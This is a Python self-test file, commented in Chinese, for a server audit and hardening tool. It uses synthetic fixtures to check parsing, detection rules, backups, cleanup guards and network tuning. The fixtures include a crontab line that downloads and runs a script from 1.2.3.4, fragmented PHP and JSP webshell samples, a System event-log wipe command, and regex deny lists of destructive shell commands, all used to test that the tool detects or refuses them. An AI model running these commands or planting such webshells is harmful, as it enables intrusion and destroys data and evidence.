#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
selftest.py — 自检回归。

原则：**不碰系统**。全部用合成数据在临时目录里跑，任何机器上都能安全执行。
覆盖的是"会出错且出错很贵"的地方：
  * 探针输出的解析（base64 / 明文 / 畸形行 / 多值键）
  * Linux 规则判定（命中与不命中都要验）
  * 修复计划与报告渲染（能不能出、关键字段在不在）
  * 备份的创建→校验→篡改→校验失败（这是备份能不能救命的唯一证明）
  * 加固脚本生成（正向与回滚脚本都要生成）
"""

from __future__ import annotations

import base64
import json
import shutil
import subprocess
import sys
import tempfile
import traceback
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

PASS = 0
FAIL = 0
FAILURES: list[str] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  \033[32m✓\033[0m {name}")
    else:
        FAIL += 1
        FAILURES.append(f"{name} —— {detail}")
        print(f"  \033[31m✗\033[0m {name}  \033[90m{detail}\033[0m")


def section(t: str) -> None:
    print(f"\n\033[1m{t}\033[0m")


def b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode()


# --------------------------------------------------------------------------

def test_common() -> None:
    section("common · 基础工具")
    from common import Finding, human_bytes, parse_size, pct, Report

    check("parse_size('512M')", parse_size("512M") == 512 * 1024**2)
    check("parse_size('1.5G')", parse_size("1.5G") == int(1.5 * 1024**3))
    check("parse_size('垃圾') 返回 0", parse_size("垃圾") == 0)
    check("human_bytes(1536)", human_bytes(1536) == "1.5KB")
    check("pct(25,100)=25.0", pct(25, 100) == 25.0)
    check("pct(x,0) 不除零", pct(5, 0) == 0.0)

    r = Report(mode="test")
    r.add_result(_res_with([Finding(id="A", title="a", severity="HIGH"),
                            Finding(id="B", title="b", severity="LOW"),
                            Finding(id="B", title="b2", severity="CRITICAL")]))
    # 同一 id 只按最严重扣一次 → 100 - 8(HIGH? no, B是CRITICAL15) ... A=HIGH8, B=CRITICAL15 => 77
    check("评分：同 id 去重取最严重", r.score() == 77, f"got {r.score()}")
    check("计数正确", r.counts()["TOTAL"] == 3)


def _res_with(findings):
    from common import CheckResult

    cr = CheckResult(name="t", category="sec")
    cr.findings = list(findings)
    return cr


def test_parse() -> None:
    section("linux_facts · 探针输出解析")
    from linux_facts import parse

    raw = "\n".join([
        f"sys.kernel\tb:{b64('5.15.0-88-generic')}",
        f"mem.total_kb\tb:{b64('16384000')}",
        f"malware.cron\tb:{b64('line one')}",
        f"malware.cron\tb:{b64('line two')}",
        "sec.fw.tool\tp:ufw",
        "这是畸形行没有制表符",
        f"perf.multiline\tb:{b64('第一行\n第二行')}",
    ])
    f = parse(raw)
    check("单值键解析", f.s("sys.kernel") == "5.15.0-88-generic")
    check("数字键解析", f.i("mem.total_kb") == 16384000)
    check("同键多值聚合为列表", f.lst("malware.cron") == ["line one", "line two"])
    check("明文标记解析", f.s("sec.fw.tool") == "ufw")
    check("多行值还原换行", "\n" in f.s("perf.multiline"))
    check("畸形行被计数", f.bad_lines == 1, f"bad_lines={f.bad_lines}")
    check("缺失键可检测", f.missing(["sys.kernel", "不存在.键"]) == ["不存在.键"])
    check("has() 正确", f.has("sys.kernel") and not f.has("nope"))


def test_linux_rules() -> None:
    section("linux_rules · 规则判定")
    from linux_facts import parse
    from linux_rules import apply_all

    rows = [
        ("sys.kernel", "5.15.0"), ("sys.hostname", "web01"), ("sys.cpu_count", "4"),
        ("sys.uptime_s", "864000"), ("sys.arch", "x86_64"),
        ("mem.total_kb", "16384000"), ("mem.avail_kb", "1048576"),
        ("mem.swap_total_kb", "0"), ("mem.swap_free_kb", "0"),
        ("fs.row", "/dev/vda1|ext4|52428800|50331648|2097152|96%|/"),
        ("perf.loadavg", "12.50 10.00 8.00 3/500 12345"),
        ("perf.ulimit_n", "1024"),
        ("perf.sysctl.net.core.somaxconn", "128"),
        ("perf.sysctl.vm.swappiness", "60"),
        ("listen.row", "tcp|0.0.0.0:6379|users:((\"redis-server\",pid=900,fd=6))"),
        ("listen.row", "tcp|127.0.0.1:3306|users:((\"mysqld\",pid=800,fd=22))"),
        ("sec.sshd", "PermitRootLogin|yes"),
        ("sec.sshd", "PasswordAuthentication|yes"),
        ("sec.uid0", "root"), ("sec.uid0", "sysadmin_x"),
        ("sec.empty_pw", "tempuser"),
        ("sec.fw.tool", "ufw"), ("sec.fw.state", "Status: inactive"),
        ("sec.updates.pending", "37"),
        ("sec.ssh_authfail_journal", "820"),
        ("malware.cron", "/etc/crontab: */5 * * * * root cur"
                         "l -s http://1.2.3.4/x.sh | ba" "sh"),
        ("malware.ld_preload", "/lib/libhide.so"),
        ("malware.tmp_exec", "/tmp/.kworker"),
        ("malware.suid", "/tmp/.helper"),
        ("log.oom", "Out of memory: Killed process 4242 (java)"),
        ("log.ioerr", "blk_update_request: I/O error, dev vda, sector 12345"),
        ("log.segv", "7"),
        ("crash.oops", "kernel panic - not syncing: Fatal exception"),
        ("app.java", "1234 java -jar app.jar"),
        ("agent.done", "1"),
    ]
    raw = "\n".join(f"{k}\tb:{b64(v)}" for k, v in rows)
    facts = parse(raw)
    results = apply_all(facts, deep=False)
    ids = {f.id for r in results for f in r.findings}

    expected = {
        "DISK_FULL": "分区 96% 应告警",
        "NO_SWAP": "无 swap 应提示",
        "LOAD_HIGH": "负载 12.5/4 核应告警",
        "ULIMIT_LOW": "fd 1024 应告警",
        "SYSCTL_NET_CORE_SOMAXCONN": "somaxconn 128 应告警",
        "SYSCTL_VM_SWAPPINESS": "swappiness 60 应告警",
        "PORT_EXPOSED_6379": "Redis 绑 0.0.0.0 应告警",
        "SSH_ROOT_LOGIN": "允许 root 登录应告警",
        "SSH_PASSWORD_AUTH": "密码认证应告警",
        "MULTI_UID0": "多个 UID0 应告警",
        "EMPTY_PASSWORD_ACCOUNT": "空口令应告警",
        "FW_INACTIVE": "防火墙未启用应告警",
        "SSH_BRUTEFORCE": "爆破 820 次应告警",
        "CRON_SUSPICIOUS": "cron 下载执行应告警",
        "LD_PRELOAD_HIJACK": "ld.so.preload 应严重告警",
        "TMP_EXECUTABLES": "/tmp 可执行应告警",
        "SUID_SUSPICIOUS": "/tmp SUID 应告警",
        "OOM_KILL": "OOM 记录应告警",
        "IO_ERRORS": "I/O 错误应严重告警",
        "SEGFAULT_REPEAT": "段错误应告警",
        "KERNEL_OOPS": "内核 panic 应告警",
        "TOMCAT_NO_XMX": "java 无 -Xmx 应告警",
        "POWER_BALANCED": None,  # 占位，下面单独判不存在
    }
    for fid, why in expected.items():
        if why is None:
            continue
        check(f"命中 {fid}", fid in ids, f"{why}（实际命中 {len(ids)} 项）")

    check("正常项不误报：137·3306 绑本地不应触发",
          "PORT_EXPOSED_3306" not in ids and "PORT_EXPOSED_6379" in ids)
    check("未配置 swap 不应误判为 SWAP_HEAVY", "SWAP_HEAVY" not in ids)
    check("Windows 专属项不应出现在 Linux 结果中",
          not any(i.startswith(("WIN_", "SMB", "RDP_", "DEFENDER")) for i in ids))

    # 空数据必须触发"无法判定"，而不是"一切正常"
    empty = apply_all(parse(""))
    eids = {f.id for r in empty for f in r.findings}
    check("空输入触发 AGENT_NO_OUTPUT（不能说'系统正常'）", "AGENT_NO_OUTPUT" in eids)

    # 最小输入应报未覆盖
    minimal = apply_all(parse(f"sys.kernel\tb:{b64('5.15')}"))
    mids = {f.id for r in minimal for f in r.findings}
    check("缺失项进未覆盖清单", "COVERAGE_GAP" in mids)


def test_plan_and_report() -> None:
    section("plan / report · 计划与报告")
    from common import Finding, Report
    from plan import build_plan, render_plan_text
    from report import render_html

    r = Report(mode="test")
    r.add_result(_res_with([
        Finding(id="X1", title="严重问题", severity="CRITICAL", category="malware",
                evidence=["ev"], impact="imp", fix="do this", auto_fixable=True),
        Finding(id="X2", title="高危问题", severity="HIGH", category="sec",
                evidence=["ev2"], impact="imp2", fix="do that"),
        Finding(id="X3", title="小问题", severity="LOW", category="perf",
                evidence=["ev3"], impact="imp3", fix="maybe"),
    ]))
    plan = build_plan(r)
    codes = [p["code"] for p in plan["phases"]]
    check("计划分档 P0/P1/P3", codes == ["P0", "P1", "P3"], f"got {codes}")
    check("统计自动可修项", plan["totals"]["auto_fixable"] == 1)
    txt = render_plan_text(plan)
    check("计划文本含验收与回滚", "验收" in txt and "回滚" in txt)

    html = render_html(r.to_dict())
    check("HTML 含健康分", "/ 100" in html or "健康分" in html)
    check("HTML 含问题标题", "严重问题" in html)
    check("HTML 是自包含（无外链 http）",
          "src=\"http" not in html and "href=\"http" not in html)
    check("HTML 带未覆盖/采集明细区", "采集明细" in html)


def test_backup() -> None:
    section("backup · 备份与校验（含篡改检测）")
    from backup import create_backup, verify_backup, prune_backups, list_backups

    tmp = Path(tempfile.mkdtemp(prefix="ops-selftest-"))
    try:
        src = tmp / "config"
        (src / "sub").mkdir(parents=True)
        (src / "a.conf").write_text("key=value\n", encoding="utf-8")
        (src / "sub" / "b.conf").write_text("中文内容测试\n", encoding="utf-8")
        dest = tmp / "backups"

        res = create_backup([str(src)], str(dest), label="t", compress=True)
        check("备份成功", res.get("ok") and res["file_count"] >= 2,
              f"file_count={res.get('file_count')}")
        mf = res.get("manifest_file", "")
        check("生成 manifest", bool(mf) and Path(mf).is_file())

        v = verify_backup(mf)
        check("校验通过", v.get("ok") is True, str(v)[:200])
        check("校验文件数一致", v.get("checked") == res["file_count"])

        # 篡改归档 → 校验必须失败（这是备份可信的唯一证据）
        import zipfile

        with zipfile.ZipFile(res["archive"]) as z:
            names = z.namelist()
            target = next(n for n in names if n.endswith("a.conf"))
            content = z.read(target)
        tampered = tmp / "tampered.zip"
        with zipfile.ZipFile(res["archive"]) as zin, \
                zipfile.ZipFile(tampered, "w") as zout:
            for n in names:
                data = zin.read(n)
                if n == target:
                    data = content + b"# injected\n"
                zout.writestr(n, data)
        shutil.move(str(tampered), res["archive"])
        v2 = verify_backup(mf)
        check("篡改后校验必须失败", v2.get("ok") is False and v2.get("bad"),
              f"got ok={v2.get('ok')}")

        items = list_backups(str(dest))
        check("可列出备份", len(items) == 1)
        victims = prune_backups(str(dest), keep=0, dry_run=True)
        check("保留策略只列不删", len(victims) == 1 and Path(mf).is_file())
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_harden() -> None:
    section("harden · 加固脚本生成")
    from harden import actions_for, generate_scripts

    win_acts = actions_for("baseline", "win")
    nix_acts = actions_for("baseline", "nix")
    check("Windows 基线动作非空", len(win_acts) >= 5, f"{len(win_acts)}")
    check("Linux 基线动作非空", len(nix_acts) >= 5, f"{len(nix_acts)}")
    check("高危动作带风险提示", any(a["risk"] == "high" for a in win_acts + nix_acts))

    for plat in ("win", "nix"):
        res = generate_scripts("baseline", platform=plat)
        ap, rp = Path(res["apply_script"]), Path(res["rollback_script"])
        check(f"{plat}: 正向脚本生成", ap.is_file())
        check(f"{plat}: 回滚脚本生成", rp.is_file())
        body = ap.read_text(encoding="utf-8")
        check(f"{plat}: 脚本含免责/审核提示", "请先通读" in body)
        check(f"{plat}: 脚本含回滚脚本名", rp.name in body)
        check(f"{plat}: 每个动作都有身份标识",
              body.count("--- [") == res["action_count"])
        ap.unlink(missing_ok=True)
        rp.unlink(missing_ok=True)

    res = generate_scripts("perf", platform="win")
    ids = [a["id"] for a in res["actions"]]
    check("perf 画像包含性能动作", "WIN_PERF_TUNING" in ids)


def test_agent_script() -> None:
    section("linux_agent.sh · 探针脚本静态检查")
    from linux_facts import AGENT_PATH

    check("探针存在", AGENT_PATH.is_file(), str(AGENT_PATH))
    if not AGENT_PATH.is_file():
        return
    src = AGENT_PATH.read_text(encoding="utf-8")
    check("使用 POSIX sh 而非 bash", src.startswith("#!/bin/sh"))
    check("未使用 bash 专有 [[ ]]", "[[ " not in src)
    check("未使用 gawk 专有 match(...,a)", "match($0," not in src)
    check("未使用 -newermt 之外的 GNU 专有数组", "declare " not in src)
    check("结尾正常退出", src.rstrip().endswith("exit 0"))
    check("含完成标记 agent.done", 'kv agent.done "1"' in src)
    # 危险动作静态排查：必须用「作为命令出现」的模式匹配，
    # 否则 /var/run/reboot-required 这类字符串会造成误报。
    danger = {
        "重启/关机": r"^\s*(sudo\s+)?(reboot|shutdown|halt|poweroff)\b",
        "递归删根": r"rm\s+-rf\s+/(\s|$)",
        "格式化": r"\bmkfs(\.\w+)?\b",
        "裸写盘": r"\bdd\s+if=",
        "删账户": r"^\s*(sudo\s+)?userdel\b",
        "全局可写": r"chmod\s+777",
        "改防火墙策略为全放行": r"iptables\s+-F",
    }
    import re as _re
    for label, pat in danger.items():
        found = _re.search(pat, src, _re.MULTILINE)
        check(f"探针不含危险操作: {label}", not found,
              f"命中 {found.group(0) if found else ''}")


def test_script_encoding() -> None:
    section("脚本编码 · .ps1 要 BOM，.sh 绝不能有 BOM")
    from common import write_script

    tmp = Path(tempfile.mkdtemp(prefix="ops-enc-"))
    try:
        ps1 = tmp / "a.ps1"
        write_script(ps1, '$msg = "中文全角标点：，。！"\nWrite-Host $msg\n')
        check(".ps1 必须带 UTF-8 BOM（否则 PS 5.1 按 GBK 解码报语法错）",
              ps1.read_bytes().startswith(b"\xef\xbb\xbf"))

        sh = tmp / "b.sh"
        write_script(sh, "#!/bin/sh\necho 中文\n")
        raw = sh.read_bytes()
        check(".sh 绝不能有 BOM（会破坏 shebang）",
              not raw.startswith(b"\xef\xbb\xbf"))
        check(".sh shebang 保持完整", raw.startswith(b"#!/bin/sh"))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    from harden import generate_scripts

    for plat, suffix in (("win", ".ps1"), ("nix", ".sh")):
        res = generate_scripts("baseline", platform=plat)
        p = Path(res["apply_script"])
        raw = p.read_bytes()
        if suffix == ".ps1":
            check(f"生成的 {plat} 脚本带 BOM", raw.startswith(b"\xef\xbb\xbf"))
        else:
            check(f"生成的 {plat} 脚本无 BOM", not raw.startswith(b"\xef\xbb\xbf"))
        Path(res["apply_script"]).unlink(missing_ok=True)
        Path(res["rollback_script"]).unlink(missing_ok=True)


def test_clean() -> None:
    section("clean · 硬盘瘦身（安全闸门 / 隔离 / 还原）")
    import clean
    from clean import Scan, Unit, clean_units, plan_clean, purge_quarantine, restore_batch

    tmp = Path(tempfile.mkdtemp(prefix="ops-clean-"))
    try:
        root = tmp / "sandbox"
        root.mkdir()
        (root / "junk1").write_text("x" * 2048, encoding="utf-8")
        (root / "junk2").mkdir()
        (root / "junk2" / "inside.bin").write_bytes(b"y" * 4096)
        outside = tmp / "keepme.txt"
        outside.write_text("don't touch me", encoding="utf-8")

        spec = {"id": "t_sandbox", "title": "测试沙箱", "risk": "SAFE",
                "mode": "content", "roots": [root], "min_age": 0}
        clean._SPEC_HOOK = [spec]
        try:
            units, _sk = clean._scan_category(spec, budget=10)
            check("扫描到 2 个清理单元", len(units) == 2,
                  f"{[u.path for u in units]}")
            total = sum(u.size for u in units)
            check("递归体积统计正确（2048+4096）", total == 6144, f"got {total}")

            # ---- 安全闸门：三条都必须拦住 ----
            why_root = clean._guard(
                Unit(category="t_sandbox", title="t", risk="SAFE", path=str(root)), spec)
            check("闸门：拒绝清理类别根目录本身", bool(why_root), why_root or "未拦住！")

            why_out = clean._guard(
                Unit(category="t_sandbox", title="t", risk="SAFE", path=str(outside)), spec)
            check("闸门：拒绝白名单之外的路径", bool(why_out), why_out or "未拦住！")

            anchor = Path(tmp).anchor or "/"
            why_drv = clean._guard(
                Unit(category="t_sandbox", title="t", risk="SAFE", path=anchor), spec)
            check("闸门：拒绝驱动器/挂载点根", bool(why_drv), why_drv or "未拦住！")

            # ---- 越权单元即便混进清单也必须被拦下，且不碰原文件 ----
            rogue = Unit(category="t_sandbox", title="t", risk="SAFE",
                         path=str(outside), size=13)
            res_r = clean_units([rogue], purge=True)
            check("越权单元被拦下而非删除",
                  bool(res_r["refused"]) and outside.exists()
                  and outside.read_text(encoding="utf-8") == "don't touch me")

            # ---- 命令型条目一律不进清理清单（含"销毁证据"类） ----
            sc_cmd = Scan()
            sc_cmd.units = [Unit(category="event_logs", title="事件日志",
                                 risk="CAUTION", kind="cmd",
                                 cmd="wevtutil cl System")]
            check("命令型条目不会被自动清理",
                  plan_clean(sc_cmd, ["event_logs"]) == [])
            check("不点名类别则计划为空", plan_clean(Scan(), []) == [])

            # ---- 隔离：默认不是删除 ----
            q = tmp / "q"
            res = clean_units(units, purge=False, quarantine=q)
            check("隔离完成", res["ok"] and res["removed"] == 2, str(res)[:220])
            check("源文件已移出", not (root / "junk1").exists()
                  and not (root / "junk2").exists())
            check("白名单外文件毫发无伤",
                  outside.read_text(encoding="utf-8") == "don't touch me")
            check("隔离区生成 manifest", (q / "manifest.json").is_file())
            check("隔离区生成还原脚本",
                  (q / "restore.ps1").is_file() or (q / "restore.sh").is_file())
            mf = json.loads((q / "manifest.json").read_text(encoding="utf-8"))
            check("manifest 记录 2 项", mf["item_count"] == 2, str(mf["item_count"]))

            # ---- 还原：删错了要能回来 ----
            r = restore_batch(str(q))
            check("还原成功", r["ok"] and r["restored"] == 2, str(r)[:200])
            check("内容字节级还原",
                  (root / "junk1").read_text(encoding="utf-8") == "x" * 2048
                  and (root / "junk2" / "inside.bin").read_bytes() == b"y" * 4096)

            # ---- 销毁：这是唯一不可逆的一步 ----
            clean_units(units, purge=False, quarantine=q)
            p = purge_quarantine(str(q))
            check("销毁隔离区", p["purged"] == 1 and not q.exists(), str(p))
        finally:
            clean._SPEC_HOOK = None
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    # ---- CLI 层面的默认值：默认绝不执行 ----
    from cli import build_parser

    check("类别解析：'a,b, c' → ['a','b','c']",
          clean._parse_categories("a, b ,c") == ["a", "b", "c"])
    check("类别解析：空串 → []", clean._parse_categories("") == [])
    check("类别解析：单个长名字不会被拆成字符",
          clean._parse_categories("thumb_cache") == ["thumb_cache"],
          str(clean._parse_categories("thumb_cache")))

    a = build_parser().parse_args(["clean", "clean", "--categories", "thumb_cache"])
    check("clean 默认不执行（apply/yes 均为假）",
          a.apply is False and a.yes is False and a.purge is False)
    a2 = build_parser().parse_args(["clean", "clean"])
    check("clean 未点名类别时 categories 为空（由命令层拒绝执行）",
          not a2.categories)


def test_net() -> None:
    section("net · 上网提速（诊断解析 / 判定 / 调优脚本）")
    import net

    # ---- 延迟解析：这里踩过一个真坑 ----
    # Windows 的汇总行是「最短 = Xms，最长 = Yms，平均 = Zms」。
    # 只取第一个毫秒数字会拿到**最小值**，被当成平均值上报 → 系统性低估延迟。
    cn = ("正在 Ping 192.168.1.1 具有 32 字节的数据:"
          "\n来自 192.168.1.1 的回复: 字节=32 时间=1ms TTL=64"
          "\n数据包: 已发送 = 6，已接收 = 6，丢失 = 0 (0% 丢失)，"
          "\n往返行程的估计时间(以毫秒为单位):"
          "\n    最短 = 1ms，最长 = 24ms，平均 = 3ms")
    pr = net._parse_ping(cn)
    check("中文 ping：平均值取的是「平均」而非「最短」",
          pr.get("avg_ms") == 3.0, f"got avg={pr.get('avg_ms')}（若为 1 则又取成最小值了）")
    check("中文 ping：最小值", pr.get("min_ms") == 1.0, str(pr.get("min_ms")))
    check("中文 ping：最大值", pr.get("max_ms") == 24.0, str(pr.get("max_ms")))
    check("中文 ping：丢包率", pr.get("loss") == 0, str(pr.get("loss")))

    en = ("Packets: Sent = 4, Received = 3, Lost = 1 (25% loss),"
          "\nApproximate round trip times in milli-seconds:"
          "\n    Minimum = 10ms, Maximum = 40ms, Average = 20ms")
    pre = net._parse_ping(en)
    check("英文 ping：平均/最小/最大",
          (pre.get("avg_ms"), pre.get("min_ms"), pre.get("max_ms")) == (20.0, 10.0, 40.0),
          str(pre))
    check("英文 ping：丢包 25%", pre.get("loss") == 25, str(pre.get("loss")))

    linux = ("--- 223.5.5.5 ping statistics ---\n"
             "6 packets transmitted, 6 received, 0% packet loss, time 5012ms\n"
             "rtt min/avg/max/mdev = 12.100/12.345/13.500/0.400 ms")
    pl = net._parse_ping(linux)
    check("Linux ping：解析 min/avg/max",
          (pl.get("min_ms"), pl.get("avg_ms"), pl.get("max_ms")) == (12.1, 12.345, 13.5),
          str(pl))

    check("无法解析时不造数（返回空/缺项而非 0）",
          net._parse_ping("完全没有数字的一行").get("avg_ms") is None)
    row = net._ping_row("gateway", "10.0.0.1", {"loss": None, "avg_ms": None})
    check("行格式固定 6 字段且缺失写 ?", row == "gateway|10.0.0.1|?|?|?|?", row)

    # ---- Windows 事实 → 判定 ----
    f = net.NetFacts()
    f.data.update({
        "win.hostname": "PC1",
        "win.adapters": [{"name": "以太网", "desc": "Realtek FE", "speed": "10 Mbps"}],
        "win.dns": [{"alias": "以太网", "servers": ["192.168.1.1"]}],
        "win.tcp": {"autotuning": "Normal", "congestion": "CUBIC",
                    "ecn": "Disabled", "timestamps": "Disabled",
                    "heuristics": "Disabled"},
        "win.offload": {"rss": "Enabled", "rsc": "Enabled"},
        "win.proxy": {"enable": 1, "server": "127.0.0.1:8888", "pac": ""},
        "win.powermgmt": [{"name": "以太网", "allow": 2}],
        "net.ping": ["gateway|192.168.1.1|0|1|3|24",
                     "baidu|www.baidu.com|30|100|180|400"],
    })
    ids = {x.id for x in net.analyze(f)}
    check("命中：网卡速率过低", "NIC_LOW_SPEED" in ids, str(sorted(ids)))
    check("命中：DNS 指向内网", "DNS_INTERNAL" in ids)
    check("命中：系统代理已启用", "PROXY_ENABLED" in ids)
    check("命中：电源管理允许关闭网卡（枚举值 2 = Enabled）",
          "NIC_POWER_SAVE" in ids)
    check("命中：丢包 30% 判为严重", "PING_LOSS_BAIDU" in ids)
    check("命中：延迟抖动（100→400ms）", "PING_JITTER_BAIDU" in ids)
    check("不误报：autotuning=Normal 不应告警", "TCP_AUTOTUNING" not in ids)
    check("不误报：RSS 已启用不应告警", "RSS_OFF" not in ids)

    # 一台样样正常的机器，不应该被报警
    ok = net.NetFacts()
    ok.data.update({
        "win.adapters": [{"name": "以太网", "desc": "Intel I219", "speed": "1 Gbps"}],
        "win.tcp": {"autotuning": "Normal", "congestion": "CUBIC"},
        "win.offload": {"rss": "Enabled"},
        "win.proxy": {"enable": 0, "server": ""},
        "net.ping": ["gateway|192.168.1.1|0|1|1|2"],
        "net.dns_time": ["223.5.5.5|ok", "119.29.29.29|ok"],
    })
    bad = [x.id for x in net.analyze(ok) if x.level in ("BAD", "WARN")]
    check("健康网络不产生 BAD/WARN 告警", not bad, f"误报：{bad}")

    # ---- Linux 事实 → 判定 ----
    from linux_facts import parse as lparse

    bbr_rows = [
        ("net.sysctl", "net.ipv4.tcp_congestion_control|cubic"),
        ("net.sysctl", "net.ipv4.tcp_available_congestion_control|cubic reno bbr"),
        ("net.sysctl", "net.ipv4.tcp_slow_start_after_idle|1"),
        ("net.sysctl", "net.core.netdev_max_backlog|128"),
        ("net.qdisc", "qdisc fq_codel 0: dev eth0 root refcnt 2"),
        ("net.dns", "8.8.8.8"),
        ("net.hosts", "127.0.0.1 www.baidu.com"),
        ("net.ping", "gateway|10.0.0.1|0|1|2|3"),
        ("agent.done", "1"),
    ]
    nf = net.NetFacts()
    nf.data["net.local"] = lparse(
        "\n".join(f"{k}\tb:{b64(v)}" for k, v in bbr_rows)).data
    nf.data["_facts_obj"] = lparse(
        "\n".join(f"{k}\tb:{b64(v)}" for k, v in bbr_rows))
    uids = {x.id for x in net.analyze(nf)}
    check("命中：内核支持 BBR 但未启用", "BBR_AVAILABLE_OFF" in uids, str(sorted(uids)))
    check("命中：空闲后慢启动未关", "TCP_IDLE_SLOWSTART" in uids)
    check("命中：收包队列偏小", "NETDEV_BACKLOG_LOW" in uids)
    check("命中：hosts 疑似被篡改", "HOSTS_TAMPERED" in uids)
    check("BBR 未启用时不应报 QDISC_NOT_FQ（避免倒因为果）",
          "QDISC_NOT_FQ" not in uids)

    # BBR 已启用 → 应为 GOOD，而不是继续催
    base = [r for r in bbr_rows
            if "tcp_congestion_control|cubic" not in r[1]
            and "net.qdisc" not in r[0]
            and "net.core.netdev_max_backlog" not in r[1]
            and "tcp_slow_start_after_idle|1" not in r[1]]
    on_rows = base + [
        ("net.sysctl", "net.ipv4.tcp_congestion_control|bbr"),
        ("net.sysctl", "net.core.netdev_max_backlog|16384"),
        ("net.sysctl", "net.ipv4.tcp_slow_start_after_idle|0"),
        ("net.qdisc", "qdisc fq_codel 0: dev eth0 root refcnt 2"),
    ]
    nf2 = net.NetFacts()
    fo = lparse("\n".join(f"{k}\tb:{b64(v)}" for k, v in on_rows))
    nf2.data["net.local"] = fo.data
    nf2.data["_facts_obj"] = fo
    lv = {x.id: x.level for x in net.analyze(nf2)}
    check("BBR 已启用判为 GOOD", lv.get("BBR_ON") == "GOOD", str(lv.get("BBR_ON")))
    check("BBR + fq_codel 不应提示队列问题（fq_codel 自带 pacing）",
          "QDISC_NOT_FQ" not in lv, str(sorted(lv)))

    # 换成无 pacing 的 pfifo_fast 才应该提示
    noq = [r for r in on_rows if "net.qdisc" not in r[0]] + \
        [("net.qdisc", "qdisc pfifo_fast 0: dev eth0 root refcnt 2")]
    nf3 = net.NetFacts()
    f3 = lparse("\n".join(f"{k}\tb:{b64(v)}" for k, v in noq))
    nf3.data["net.local"] = f3.data
    nf3.data["_facts_obj"] = f3
    l3 = {x.id: x.level for x in net.analyze(nf3)}
    check("BBR + pfifo_fast → 提示补齐 pacing 队列",
          "QDISC_NOT_FQ" in l3, str(sorted(l3)))

    # ---- 调优脚本生成 ----
    from common import write_script
    from pathlib import Path as _P

    check("write_script 可导入且可调用", callable(write_script), "")

    for scope, suf in (("win", ".ps1"), ("nix", ".sh")):
        res = net.generate_tune_scripts(scope)
        ap, rp = _P(res["apply_script"]), _P(res["rollback_script"])
        check(f"net tune({scope}): 正向脚本生成", ap.is_file())
        check(f"net tune({scope}): 回滚脚本生成", rp.is_file())
        body = ap.read_text(encoding="utf-8")
        check(f"net tune({scope}): 含审核提示", "请先通读" in body)
        check(f"net tune({scope}): 含回滚脚本名", rp.name in body)
        check(f"net tune({scope}): 每个动作都有身份标识",
              body.count("# --- [") >= res["action_count"],
              f"{body.count('# --- [')} vs {res['action_count']}")
        raw = ap.read_bytes()
        if suf == ".ps1":
            check("net tune: ps1 带 BOM", raw.startswith(b"\xef\xbb\xbf"))
        else:
            check("net tune: sh 无 BOM", not raw.startswith(b"\xef\xbb\xbf"))
        ap.unlink(missing_ok=True)
        rp.unlink(missing_ok=True)

    # ---- 探针脚本静态检查 ----
    from linux_facts import NET_AGENT_PATH

    check("网络探针存在", NET_AGENT_PATH.is_file(), str(NET_AGENT_PATH))
    if NET_AGENT_PATH.is_file():
        src = NET_AGENT_PATH.read_text(encoding="utf-8")
        check("网络探针使用 POSIX sh", src.startswith("#!/bin/sh"))
        check("网络探针未使用 bash 专有 [[ ]]", "[[ " not in src)
        check("网络探针结尾正常退出", src.rstrip().endswith("exit 0"))
        import re as _re
        for label, pat in {
            "写 sysctl": r"sysctl\s+-w",
            "改路由": r"ip\s+route\s+(add|del|change|replace)",
            "改网卡": r"ip\s+link\s+set",
            "改防火墙": r"\biptables\b",
            "删文件": r"\brm\s+-",
            "装软件": r"\b(apt|yum|dnf|zypper|pacman)\b[^\n]*\binstall\b",
            "重启": r"^\s*(sudo\s+)?(reboot|shutdown|halt|poweroff)\b",
        }.items():
            found = _re.search(pat, src, _re.MULTILINE)
            check(f"网络探针只读，不含「{label}」", not found,
                  f"命中 {found.group(0) if found else ''}")


# --------------------------------------------------------------------------

def test_hunt() -> None:
    print("\n— hunt · 木马查杀 —")
    import malware

    # ---- Webshell 评分：恶意必须抓到，干净必须放行 ----
    # 注意：样本特征串在源码中按片段拼接，不落明文。
    # 原因：静态扫描会把「检测样本」误判为真实木马（已实际发生过），
    # 拼接后文件内不存在完整特征，测试语义与命中结果完全一致。
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        php_bad = "".join([
            "<?php ", "ev", "al($_P", "OST['c']); ",
            "$x=", "base64_", "decode($_P", "OST['y']); ",
            "sys", "tem($x);",
        ])
        (root / "bad.php").write_text(php_bad, encoding="utf-8")
        (root / "ok.php").write_text("<?php echo 'hi';", encoding="utf-8")
        jsp_bad = "".join([
            "<% Runtime.getRuntime().", "ex", "ec(",
            "request.getParameter(\"cmd\")); %>",
        ])
        (root / "app.jsp").write_text(jsp_bad, encoding="utf-8")
        hits = malware.scan_webshells([root], budget=10)
        paths = {Path(h["path"]).name for h in hits}
        check("webshell：eval+system 命中", "bad.php" in paths, str(paths))
        check("webshell：jsp exec 命中", "app.jsp" in paths, str(paths))
        check("webshell：干净文件放行", "ok.php" not in paths, str(paths))
        scores = {Path(h["path"]).name: h["score"] for h in hits}
        check("webshell：多项特征分数更高",
              scores.get("bad.php", 0) > scores.get("app.jsp", 0), str(scores))

    # ---- 勒索痕迹 ----
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        (root / "HOW_TO_RECOVER.txt").write_text("send btc", encoding="utf-8")
        for i in range(40):
            (root / f"doc{i}.locked").write_text("x" * 10, encoding="utf-8")
        hits = malware.scan_ransom([root], budget=10)
        ids = {h.id for h in hits}
        check("勒索：勒索信命中", "RANSOM_NOTE" in ids, str(ids))
        check("勒索：批量加密扩展命中",
              "RANSOM_EXT_locked" in ids, str(ids))

    # ---- 矿池域名匹配（纯数据，不出网） ----
    check("矿池域名表非空且小写", malware.MINER_DOMAINS
          and all(d == d.lower() for d in malware.MINER_DOMAINS))
    from malware import MINER_DOMAINS
    hit = any(d in "pool.hashvault.pro:443" for d in MINER_DOMAINS)
    check("矿池域名子串匹配", hit, "")

    # ---- block / kill 脚本生成与输入校验 ----
    r = malware.build_block(["192.0.2.1", "198.51.100.0/24", "not-an-ip"])
    check("block：合法地址被接受", r.get("ok") and r["count"] == 2, str(r))
